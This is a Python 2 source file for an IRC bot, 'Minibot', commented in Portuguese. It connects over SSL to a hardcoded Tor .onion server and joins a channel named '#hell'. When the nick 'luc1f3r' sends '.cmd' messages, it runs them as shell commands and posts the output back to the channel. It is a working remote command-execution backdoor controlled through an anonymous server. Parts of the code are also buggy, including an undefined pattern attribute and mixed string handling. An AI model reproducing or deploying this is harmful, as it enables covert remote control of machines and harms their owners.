# -*- coding: utf-8 -*-
import socket
from threading import Thread
import time
import os
import subprocess
#import urllib2
#from irc import MyIrc
import ssl 
class Minibot:

    def __init__(self, server, port, nick, name, email, channel, password):
        #self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # cria um socket para conexao
        self.s = socket.socket()
        self.s = ssl.wrap_socket(self.s)
        self.s.connect((server,port)) #conecta no servidor e porta
        time.sleep(0.5) # espera 0.5 segundos
        self.s.recv(4096) # recebe 4kb do servidor 
        self.nick = nick  # atribui apelido
        self.name = name #atribui nome
        self.email = email #atribui email
        self.data = ''  #container dos dados vindo do servidor
        self.channel = channel #atribui canal
        self.command =  None
        self.password = password
        self.close = False #flag de fechamento
        self.pong =''


    def getNick(self):
        return self.nick

    def getServer(self):
        return self.server
    
    def getPort(self):
        return self.port

    def decode(self, string):
        string = string.decode("utf-8")
        string = string.strip('\r\n')
        return string

    def encode(self, string):
        string = bytes(string)
        return string

    def ircSend(self, msg):
        msg = "PRIVMSG {0} :{1}\n".format(self.channel, msg)
        msg = self.encode(msg)
        self.SendCommand(msg)
        return

    def ircMessage(self, person, msg):
        msg = "PRIVMSG {0} :{1}\n".format(person, msg)
        msg = self.encode(msg)
        self.SendCommand(msg)
        return
        
    def ping(self):
        self.SendCommand(bytes("PONG :pings\n", "utf-8"))
        return    

    def runCMD(self, channel, command):
    
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        output, err = output.communicate()
        output = output.decode("utf-8")
        #output = output.strip("\n")
        output = output.replace('\n',' ')
        self.sendMessage(channel, output)
        return

    def findChannel(self, message):
        channel = self.channelPattern.findall(message)
        channel = channel[0].strip("!")
        return channel

    def hello(self):
        self.ircSend("Hello!")
        return

    def sendMessage(self, channel, ircMessage):
        self.ircMessage(channel, ircMessage)
        return         
         
    def SendCommand(self, cmd):  # funcao de envio de comandos ao servidor
        comm = cmd + '\r\n' #o comando atribui \r\n (obrigatorio para o servidor responder com sucesso)
        self.s.send(comm) #// envia ao servidor
     
         
    def SendPingResponse(self):  #funcao de envio de ping
        if self.data.find('PING') != -1:  #captura mensagem do servidor e verifica se contem PINNG
            self.SendCommand('PONG ' + self.data.split(":")[1]) # se tiver envia comando PONG + (numero do tempo em ms?)
            print 'PONG ' + self.data.split(":")[1]
            time.sleep(1) #espera 15 segundos pra enviar denovo (se tempo menor pode flooda ro server e te kikar) 
    
    def SendPong(self):
        if self.data.find('PING') !=-1:
            if self.data.split(":")[1] !='cgan.onion.garlic':
                self.pong = self.data.split(":")[1]
                print 'PONG ' + self.data.split(":")[1] 
                time.sleep(2)    
        
    def run(self):  #loop principal do bot  para manter vivo
        self.SendCommand('NICK ' + self.nick)  #envia pedido de nick
        self.SendCommand('USER ' + self.nick + ' ' + self.name + ' ' + self.email + ' :Irc Python') #cria uma credencial de usuario
        #self.SendCommand('PRIVMSG NickServ identify ' + self.password + '\r\n')
    #self.SendCommand('JOIN ' + self.channel) #entra no canal
        while self.close == False:
            self.data = self.s.recv(4096)  #data fica recebendo todos dados do servidor e guarda em data
            self.SendPingResponse()        #envio de ping e resposta de pong do servidor (se nao responder usuario cai)
            time.sleep(0.5)                #espera meio segundo pra "respirar"
            if self.data.find('.clear') != -1:
                os.system("clear")
            if self.data.find('hi CrazyBot31') !=-1:
                nick = self.data.split("!")[0]
                nick = nick.replace(":",'')
                self.sendMessage(self.channel,nick + " Hi I am here and Work now")
            if self.data.find('sun of bitch') !=-1:
                nick = self.data.split("!")[0]
                nick = nick.replace(":",'')
                self.sendMessage(self.channel,nick + " Mother? Finally I found you . :D so happy now")
            if self.data.find('.cmd')   !=-1:
                if self.data.split("!")[0] ==':luc1f3r':
                    cmd = self.data.split(":")[2]
                    cmd = cmd.split(".cmd ")[1]
                    cmd = cmd.split('\r\n')[0]
                    print cmd
                    print self.runCMD(self.channel,cmd)
                else:
                    nick = self.data.split("!")[0]
                    self.sendMessage(self.channel,nick + " You are not allowed to run this command!")
                    self.SendCommand('ignore' + nick )
                    
            print self.data #imprive tudo que vier do servidor
            if self.data.find( "This nickname is registered") !=-1:
                self.SendCommand('PRIVMSG Nickserv identify ' + self.password + '\n')
                self.SendCommand('JOIN ' + self.channel)
                print "LOGADO"

if __name__ == '__main__':
    servidor = '6dvj6v5imhny3anf.onion' #aqui digite seu servidor
    porta = 6697 #aqui sua porta (padrão 6667)
    nick = 'CrazyBot31' #mude para seu nick
    name = 'CrazyBot' #digite seu nome
    email =  'Crazy@gmail.com' #digite seu email
    canal = '#hell' # coloque seu canal
    password='passwordchat'
    bot = Minibot(servidor ,porta,nick ,name , email, canal, password)     #cria um bot
    bot.run() # roda o loop principal do bot
